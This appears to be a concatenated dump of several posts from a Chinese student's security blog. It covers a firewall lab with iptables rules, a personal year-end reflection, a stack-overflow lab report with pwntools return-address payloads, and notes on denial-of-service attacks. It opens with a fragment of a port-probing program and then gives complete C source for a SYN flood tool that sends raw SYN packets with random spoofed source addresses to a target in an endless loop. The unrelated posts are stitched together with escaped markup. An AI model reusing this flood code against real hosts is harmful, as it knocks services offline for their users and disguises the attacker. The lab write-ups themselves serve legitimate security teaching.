sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d 端口已经探测\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 发送tcp包到目的机确定端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d已攻击!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } Windows防火墙：天网防火墙\nLinux防火墙： iptables\nFTP服务器：Ser-U\n抓包工具：Wireshark\nUDP攻击：UDP-Flood\n0x03 实验内容 3.1 windows防火墙 3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据 在防火墙中添加如下规则： 这样接收到的所有TCP包都会被拦截，并且被记录。 没有开启防火墙前，在终端执行发送随机端口的tcp程序 通过Wireshark抓包，我们可以看到此时的TCP包并没有被拦截。 开启防火墙，再度启动程序。 可以看到防火墙进行提醒，并且日志里面显示了攻击机向靶机192.168.195.131的端口tcp连接。 因此加上该端口后，所有tcp包都被截断了。 3.1.2 过滤R-\u0026gt;L中数据包源端口为21或80的数据 发送到端口为21和80的传输层协议可能为tcp也可能为udp\n因此编写进出规则的时候，我们需要对TCP和UDP都进行限制。\nUDP TCP 因为我的客户端已经开启了21和80端口，所有我们这里直接选择已授权开放的端口即可。 TCP\n防火墙开启前：\n可以看到TCP包可以发到机器。 开启防火墙\n攻击80端口\n可以看到在日志里面程序连接80端口被拒绝。 攻击21端口\n可以看到这里连接21端口同样被拒绝。\nUDP\n关闭防火墙\n攻击80端口\n可以看到抓到udp包\n开启防火墙\n攻击80端口\n可以看到80端口的udp包已被拦截 攻击21端口\n可以看到21端口的udp包已被拦截\n3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证） 在windows xp192.168.195.162中搭建ftp服务器 创建一个ftp用户，账户为admin，密码为admin； 我们在本机访问服务器端 我们成功访问到服务器端。 设置规则 当我们向服务器端发送ftp请求的时候，会通行。 3.1.4 阻止将ftp内容列表、上传、下载数据 这里我们是原先的客户端作为新的服务器，另一台机子来访问这个新的服务器，我们需要在服务区的防火墙上配置规则，从而阻止客户端下载服务器端内容 在新的服务器端配置FTP 客户端查看效果 在服务器端配置防护墙规则 当收到端口为21的tcp请求的时候拒绝该访问，这样就保证了客户端不能从服务器下载。 开启防火墙 结果 我们可以在日志里面看到 IP192.168.195.182对客户端的连接被拒绝 同时，该网页也无法打开，自然查看列表什么的，上传、下载都无法进行， 3.2 Linux防火墙 iptables 3.2.1 Iptables防火墙的启动停止 首先通过以下命令安装好iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service 然后通过命令service iptables status查看此时的iptables状态\n此时防火墙为打开状态 关闭防火墙service iptables stop\n再度查看此时防火墙状态 发现此时防火墙已关闭。 打开防火墙service iptables start\n再查看防火墙状态 防火墙已打开 3.2.2 Iptables防火墙规则查看、添加、删除 查看\n命令 iptables -L -n 列出（filter表）所有规则 命令 iptables -nL –line-number 列出（filter表）所有规则，带编号 命令 iptables -L -n -t nat 列出（nat表）所有规则 添加\n添加规则有两个参数：-A和-I。其中-A是添加到规则的末尾；-I可以插入到指定位置，没有指定位置的话默认插入到规则的首部。 当前规则： 添加一条规则到尾部：iptables –A INPUT -j ACCEPT 意思为：向filter表（默认表）的INPUT链中追加一条规则，其功能是接受源地址为任意、目标地址为防火墙本身的所有数据包。 第六条即为我们新加入的规则 添加一条规则到第三条： iptables -I INPUT 3 -s 192.168.195.131 -j DROP 可以看到新规则添加到第三条了 删除\n删除用-D参数\n删除之前添加的规则 iptables -A INPUT -j ACCEPT：\n命令： iptables -D INPUT -j ACCEPT\n可以看到我们之前添加的第七条规则已经被删除。 有时候要删除的规则太长，删除时要写一大串，既浪费时间又容易写错，这时我们可以先使用–line-number找出该条规则的行号，再通过行号删除规则。这里我们删除第三行我们插入的规则。\n命令：iptables -D INPUT 3\n可以看到我们插入的第三条规则已经被删除。\n3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能 3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证） 我们首先将所有规则都删除iptables -F 可以看到我们之前的规则全部被清除掉。 此时我们通过机器192.168.195.131来ping我们此时的Linux主机192.168.195.174 正常可以ping通 禁止所有进入本地机器的数据包通过 命令如下：iptables -I INPUT -j DROP 将规则加入到INPUT链中 所有发给本机的包都会被丢弃掉 此时再度ping我们的本机192.168.195.174 很明显的主机已经接收不到ping的包了 3.2.3.2 允许某特定IP主机远程ping本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程ping本地主机\n我们这里设定运行192.168.195.131可以ping通，其余的主机均无法ping通机器\n命令：\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT 因为iptables中规则的执行为从上到下，所以按照上述给定的程序插入规则。\n结果为：\n这样就保证接收到192.168.195.131的包，其余的包均丢弃。\n这里直接放出两个机器防火墙开启前后ping的状态。\n其他机器 192.168.195.131 3.2.3.3 允许某特定IP主机远程telnet或putty本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程telnet或putty本地主机,，开启端口23 即可\n命令：\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT 目的端口为23的被丢弃，因为第二条规则顺序在第一条前面，所有先判断是否为特定IP，是的则接受，否则丢弃。 开启防火墙前：\n192.168.195.131\n其他机器：\ntelent均可以正常连接\n开启iptables\n对于192.168.195.131的机器\n发现仍然可以正好连接telnet 对于其他机器\n可以看到连接不到telnet 0x04 选做题 4.1 由本机登录ftp服务器成功（通过用户名、密码验证） 允许本机登录其他服务器的ftp:192.168.195.162\n因此这里的防火墙为output向外面服务器以21端口发送请求。\n命令：iptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\n所有源端口为21 发往外网的包都被允许通过。 执行防火墙之后，我们可以发现我们发往外网21端口的包可以被ACCEPT 然后通过ftp 192.168.195.131 输入账户admin和密码admin 我们成功连接到了ftp服务器。 4.2 无法将ftp内容列表或上传、下载数据 这里我们的Centos 7本身作为一个FTP服务器来等待客户端的连接。\n在本地配置好ftp环境\n可以看到我们的环境已经配置完毕 同时在客户端，我们也可以访问Linux服务器 为了禁止其他用户下载我们linux服务器端的所有数据，也防止上传,即禁止用户访问我们的FTP服务器。\n所以有命令：iptables -I INPUT -p tcp --dport 21 -j DROP 所有目的端口为21的数据包都将被丢弃 此时我们的客户端再度访问我们的Linux FTP 服务器端\n可以看到我们此时已经无法访问该文件夹了。无法访问到我们的Linux服务器 0x05 实验结论 通过对Windows下和Linux下防火墙的配置情况，自己亲自编写防火墙的相关规则，对包过滤防火墙有了进一步的了解和认知。同时针对不同环境下防火墙配置，Linux下的防火墙配置应该比Windwos更为自由，自定义的比较多。 ","permalink":"http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/","summary":"防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T","title":"防火墙实验"},{"content":"2021 小结 当一个人坐在空无一人的宿舍里，也许是无聊吧，也许是眼慕朋友圈满天飞的跨年小结，也许是看各种推送的年度总结有感，因此总想写点什么东西，特别是在这种孤单的气氛中，这种感觉很难形容，总想提笔倾诉一点东西，不吐不快。 2021年总的来说，成功遗憾参半。如果2021年度总分十分的话，我只能打到7分。 这大概是本人第一次个人年度小结，当然也没人看，也就随便写写自己相对自己想说的话。 2021年度的收获 当然说起收获，自然是这个写作的平台博客了。 探店北京美食。 在Lord佬的带飞下，拿个天融信小奖项。 收获一批很不错的足球小伙伴。最后也拿了一个网安院的小足球比赛的冠军。 去逛了从小到大书本里记载里的长城，初春时刻，看巍峨的长城崎岖蜿蜒。 在学业上有了相当程度的精进，大一时候存在一定的摆烂，因此大一的成绩与保研无望，同时人际交往较少，但是大二通过担任班级学委，可以说极大拓展了交往的朋友圈，也认识了可以一些可以相识的朋友，成绩也有了一些小突破，可以说比较接近保研的名额。 人际交往方面，个人性格的缺点相当严重，自卑吧，也许只能在熟人面前能够倾吐自己的想法，但是这种讲话的方式却又十分的丑陋，往往会惹得其他人不满，然后自己也相当不爽，但是自己也只能把所有心事埋在心里，自己不断地反思自己的问题，也许就是谨言慎行吧，说话要懂得符合事宜、不能满嘴跑火车，说话方式也有了极大地改善。 性格方面，这一年应该说成长了不少，因为从小接受教育比较封闭的问题，初中高中的沟通比较少，内向还是有的。这一年通过一些交流、外出游玩性格应该是开放了一点、敢说，不再是自闭儿童了。其实吧，人应该自信一点。 技术方面：学了爬虫、简单的web前端、php、还有一些CTF的方向。 生活习惯：相当不自律，大三上的半年中每晚平均都是一点半之后睡觉，大部分都是二点之后才浑浑噩噩的睡着，昼夜作息极度紊乱，早餐基本半年没吃过一次。 BVB，罗伊斯拿下人生中第一个比较重要的冠军头衔：德国杯。 2021年的遗憾 最大的遗憾应该是大学两年半，却从未去过号称文化精华的故宫，总是以各种各样的原因鸽了故宫，这里立一个flag:2022年度无论如何都要看一看故宫的模样。 还有遗憾就是，大学第一次相对正式的足球比赛，校长杯表现相当糟糕，也许一生中也很难忘记这场比赛，总而言之，就是心态糟糕，技术糟糕。 还有就是对于想学的技术往往不能坚持到底，意志力不够强大，一直对网络安全方面的知识感兴趣，但是总是三心二意。 在相识的人中，走丢了一些人。也许这就是人生吧，当有人意见与你想左的时候，你不能强迫所有人都能达成共识，不是所有人的三观都是相同的，总有人要下车，也总有人要上车，静观其变，随其飞去吧。 本学期的相当一部分作业为小组合作形式，往往不能够正常的分工、合作、团队意识还是欠缺。 还有就是对于想要的不敢直说，(这就是含蓄？)，毫无疑问，这丢掉了一大堆想要的东西，可望而不可即。 对于学委的工作，有一点疲倦，如果可以，任期满的时候考虑辞职。 大三上的半年课认识到了院里老师的一些水平，是时候考虑往更大的方向考虑。 2022 希望 1、去一次故宫 2、努力学习技术，拿到一个心仪的实习offer 3、继续专心学习，确保学业能够拿到保研资格 4、对足球更上心吧，练练技术、拉拉体能，争取能在校长杯上场吧，有所表现吧。 5、继续目前的人际交往，如果可以，可以认识更多的朋友。 6、去更多的地方游玩，希望五一或国庆假期到内蒙或者长沙玩一次。 总结 总而言之，就是以上了，还是太矫情了，但是吧，人总要倾吐一点东西，2021就这样吧，2021就到这里了。\n希望2022会更好。\n","permalink":"http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","summary":"2021 小结 当一个人坐在空无一人的宿舍里，也许是无聊吧，也许是眼慕朋友圈满天飞的跨年小结，也许是看各种推送的年度总结有感，因此总想写点什么东西，特","title":"2021年度总结"},{"content":"栈溢出报告 0x01 目标 通过对程序输入的密码的长度、内容等修改用Ollydbg来验证缓冲区溢出的发生（参考提供的两个代码） 完成淹没相邻变量改变程序流程实验 完成淹没返回地址改变程序流程实验 附加题 以StackOverrun程序为靶子，通过自己使用ollydbg调试，两个要求：其一，要求分析PE格式加载到内存中的地址变化；其二，挑选其中一处函数的跳转，详细分析，跳转时sp，bp，ip的变化，要求以程序运行的顺序记录跳转时的这些寄存器的变化。 在没有源代码的情况下，先推测程序的功能，然后尝试修改StackOverrun程序的流程，通过淹没返回地址，比如可以尝试用jmp esp的方式（方式可以自选），让其调用bar函数并输出结果。 0x02 测试步骤和结果 2.1 overflow_var 淹没相邻变量 2.1.1 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8];// add local buff authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; while(1) { printf(\u0026#34;please input password: \u0026#34;); scanf(\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); break; } } system(\u0026#34;pause\u0026#34;); } 程序输入一个passoword,然后作为参数将其传递给函数verify_password函数里面\n在verify_password函数里面创建两个局部变量，authenticated参数最后作为返回，buffer参数存储传递进来的password，\nauthentiacted参数存储password和定义好的全局变量PASSWORD的经过strcmp函数之后的返回值，最后程序返回authentiacted。\n回到main函数之后，valid_flag存储的为上面的返回值，如果输入相同，即输出incorrect password!\\n\\n,其他情况，输出Congratulation! You have passed the verification!\\n。\n执行程序效果如图：\n2.1.2 ollydbg调试分析 通过IDA分析，我们可以确定main函数地址为0x4010A0 直接在ollydbg中设置断点，然后使程序 运行到该位置 local.1即为valid_flag的参数值 mov eax,0x01 test eax,eax即为实现while(1)循环 接下来printf,scanf，verify_password函数均如上图所示。 进入函数0x401440进行分析 我们首先输入密码123456 进入函数分析 发现我们eax存储的为我们输入的密码123456, 程序将PASSWORD和eax连个参数的地址均压入栈中。 真实的buffer存储在地址0x188FB44 可以看到经过函数strcmp之后的返回值存储在eax里面，然后赋值给[local.1] 然后buffer地址为0x18FAE0 进而我们发现authenticated参数的地址即为0x18FAE8，并且因为明显123456小于1234567，所以参数被覆盖为0xFFFFFFFF 输入密码1234567 我们发现authenticated参数的地址即为0x18FAE8，并且因为明显123456小于1234567，所以参数被覆盖为0x00000000 2.1.3 淹没相邻变量 因为子函数verify_password返回的值为authenticated的值，所以我们只需要覆盖掉这个参数，将其覆盖为0即可，满足我们的需求。 考虑到内存中小端存储的特点，加上buffer空间的大小为8字节，所以我们只需要输入八个字符，让字符串的截断符null覆盖掉参数authenticated即可满足条件。 我们这里输入密码123456# 用ollydbg看一下栈中内容变化 可以很清楚的看到参数被覆盖为0了。同时程序输出 2.2 overflow_ret 淹没返回地址 2.2.1 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; if(!(fp=fopen(\u0026#34;password.txt\u0026#34;,\u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp,\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); } fclose(fp); } 程序实现，读取文件password.txt的内容作为password\n然后将password作为参数传递给verify_password函数\n其余的分析过程与上述没有区别，不在赘述\npassword.txt填充123456\npassword.txt填充1234567\n2.2.2 IDA_PRO分析 我们这里需要覆盖掉子函数的返回地址，将其返回地址改为打印出Congratulation! You have passed the verification!\\n. 这里我们首先查看一下子函数verify_password的栈空间，buffer大小 IDA-PRO我们进入子函数，将其反汇编 v3即为buffer变量，v4代表authenticated 查看v3在内存中的分布情况 考虑到 strcpy函数并没有检验赋值的字符串长度，因此字符串可以溢出。 发现buffer数组填充0x0c+0x04个字符即可以覆盖到返回地址。 这里找到返回地址为0x40112f 2.2.3 淹没返回地址 根据上述分析，我们很容易根据pwntools写出相应的shellcode\n1 2 3 4 5 6 7 from pwn import * ret = 0x40112f payload = b\u0026#39;a\u0026#39;*0x10 + p32(ret) with open(\u0026#34;password.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) 可以比较清晰的看到ebp被覆盖为aaaa,返回地址也被覆盖为0x40112f\n0x03 测试结论 我们通过栈溢出两个例子，分别覆盖返回地址和相邻关键变量，通过strcpy对数组边界的没有要求，我们都可以成功的达到目标。 这充分证明我们在实际编程中要使用安全的函数s_scanf或者安全的strcpy函数，否则容易造成严重的栈溢出攻击。 同时呢，通过栈溢出我们可以劫持程序的EIP来到我们想运行的任何代码中，我们也可以恶意修改一些关键参数来达到攻击的目的。 简述一下覆盖相邻变量原理 这里我们通过越过数组buffer的边界， 利用字符串的截断符\\x00来覆盖掉参数authenticated，从而保证将其返回值修改恒为0。 简述一下覆盖范湖地址原理 我们这里直接利用超长的 buffer字符串，覆盖掉整个buffer,参数authenticated，ebp,将返回地址覆盖为我们需要的地址0x40112f 0x04 附加题 4.1 静态分析 使用IDA_Pro打开程序进行静态分析\n首先打印两个函数的地址0x401000,0x401060,然后将argv[1]作为参数传递给函数sub_101000 然后进入函数sub_401000查看函数功能 将输入的参数赋值给v2，然后打印赋值 前后两次的栈内空间变化。 进入函数sub_401060查看函数功能 打印出i have been hacked！ 在ollydbg中，将参数赋值为test，查看具体原理\n第一次打印栈中内容 赋值后打印栈中内容 4.2 PE加载内存地址变化 我们用010editor分析一下没有加载情况下的程序 相对应的text、rdata、data段地址分别为0x401000,0x405000,0x406000 我们可以看到PE结构分为四部分 其中Sections 分为text,data,rdata几部分。 0x1000h之前的数据都是用于程序加载用的，用于检验PE文件格式，计算文件偏移。 接下来看一下内存映像结构 因为程序加载用到相对虚拟地址,exe为0x400000, text段开头与加载后的对比 可以看到字节码是对应的 我们发现字符串静态下的情况位于data 段 这里以Now the stack looks like: 因此这里加载后的地址即为0x400000+0x6030 总而言之 RVA是在PE文件中为了避免使用确定的内存地址，出现了相对虚拟地址（Relative Virtual Address，简称RVA） – RVA是内存中相对于PE文件装入地址的偏移位置，是一个“相对地址”，或称为“偏移量 VA指的是进程装入内存后实际的内存地址，被称为虚拟地址（Virutal Address，简称VA） VA=Image Base + RVA 4.3 函数跳转寄存器变化 这里也以参数test为例子，分析一下进入foo前后栈帧的变化 这里发现栈顶esp存储的为test,eip此时指向的为call foo，ebp指向main函数的栈帧底部。 进入foo函数 一系列入栈操作 发现这个函数没有进行ebp处理， 所以ebp仍然为main函数的栈底 但是esp经过一系列的更新，进一步的向上扩张，同时eip指向foo函数的当前指令 执行完foo函数之后，回到main函数 发现esp,ebp回到进入foo函数之前的样子，eip执行调用call指令之后的下一条地址0x40109B 4.4 栈溢出调用bar 这里在IDA里面分析发现，要复制的字符串v2的空间如下：\n占据0x0c个字符之后，便为返回地址， 因此我们用0x0c个字符将其覆盖，在填充我们需要的函数地址0x401060即可达到目标\n利用pwntools易得脚本如下：\n1 2 3 4 5 6 7 from pwn import * ret = 0x00401060 payload = b\u0026#39;a\u0026#39;*0x0c +p32(ret) with open(\u0026#34;stackover.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) 将payload直接在命令行中输入，拿到shell\n","permalink":"http://www.reus09.top/posts/tech/%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"栈溢出报告 0x01 目标 通过对程序输入的密码的长度、内容等修改用Ollydbg来验证缓冲区溢出的发生（参考提供的两个代码） 完成淹没相邻变量改变程序流","title":"栈溢出"},{"content":"拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提知识 DoS（Denial of Service）攻击 凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。 DDoS（Distributed Denial of Service）攻击 借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站 DDoS攻击类型 基于操作系统/应用软件漏洞的DDoS攻击；\n基于协议漏洞的网络层DDoS攻击；\n利用协议漏洞，导致目标资源被大幅占用。是最常见的攻击方式，但需要一定规模的傀儡主机。 面向网络资源的DDoS攻击；\n攻击者控制傀儡机同时发送正常报文，导致目标资源被耗尽。这种攻击方式最难防范，攻击者也需要控制较大规模的主机或服务器 Ping of Death 攻击点：操作系统协议栈没有处理例外情况的设计缺陷。 原理：利用了协议实现时的漏洞（CVE-1999-0128）。ICMP协议用于诊断网络状况（端点是否可达等）。正常情况下，A向B发送ICMP echo request，B收到后返回ICMP echo reply。则A知道，B在线、可达。ICMP包除了包头外，还可以携带数据。这些数据不用于进一步处理，仅辅助诊断网络状况（根据收到响应的时间判断网络是否通畅）。攻击者制造超长数据包，使得数据包超过65535字节上限。没有异常处理的协议栈，收到这样的数据包，可能会由于缓存区溢出而崩溃。（IP数据包的最大长度为65535B，IP首部长度为20B，ICMP首部为8字节，ICMP包最大数据长度为：65535-20-8=65507B. Smurf 以目标IP为源地址，以广播地址为目地址，发送ICMP Echo请求。广播地址对应网络上的每台主机都能收到请求，并向目标发送ICMP Reply，导致目标被大量应答占据资源。 UdpSmurf 利用7号(echo)端口。根据协议，若端口开放，则回送应答UDP数据包。若端口关闭，则发送一个ICMP报文（目标不可达）。 攻击者以广播地址为目标地址，以受害者地址为源地址，使得大量应答包送往受害者。 TCP SYN Flood攻击 通过虚假的数据包，造成目标保存大量半开TCP连接。 管理TCP连接需要系统资源，系统能忍受的半开连接有上限。 当半开连接达到一定数目时，系统将不再接收新的连接请求。 正常的服务请求因此得不到响应。 